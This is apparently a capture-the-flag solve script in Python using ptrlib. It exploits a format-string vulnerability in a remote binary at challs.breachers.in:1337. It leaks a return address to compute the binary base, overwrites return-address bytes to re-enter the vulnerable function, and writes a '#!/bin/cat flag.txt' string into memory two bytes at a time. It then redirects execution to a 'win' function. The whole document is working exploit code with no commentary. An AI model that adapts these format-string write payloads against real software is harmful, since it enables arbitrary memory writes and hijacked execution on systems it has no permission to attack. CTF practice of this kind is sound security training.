from ptrlib import *

exe = ELF("./main")

# p = Process("./main")
p = Socket("challs.breachers.in", "1337")
elf_bytes = b"#!/bin/cat flag.txt\x00"

p.sendlineafter(b"Enter your first name: ", b"%19$p")
ret_addr = int(p.recvline().decode().split("entered ")[1], 16)
exe.base = ret_addr - (exe.symbol("main") + 58)
call_vuln_loc = exe.symbol("main") + 53

ret_payload = b"%" + str(call_vuln_loc & 0xFF).encode() + b"c%7$hhn"
p.sendline(ret_payload)
buf_addr = exe.symbol("buffer")
for i in range(len(elf_bytes) // 2):
    to_write = elf_bytes[2 * i : 2 * i + 2]
    payload = fsb(12, {buf_addr + 2 * i: u16(to_write)}, bs=2, bits=64, size=2)
    logger.info(f"Sending {len(ret_payload)} bytes")
    logger.info(ret_payload)
    p.sendlineafter(b"Enter your first name: ", ret_payload)
    logger.info(f"Sending {len(payload)} bytes")
    logger.info(payload)
    p.sendlineafter(b"Enter your last name: ", payload)
    logger.info(f"Written till byte {2 * i + 2}")

win = exe.symbol("win")
win_payload = b"%" + str(win & 0xFFFF).encode() + b"c%7$hn"
p.sendlineafter(b"Enter your first name: ", win_payload)
p.sendlineafter(b"Enter your last name: ", win_payload)
p.interactive()
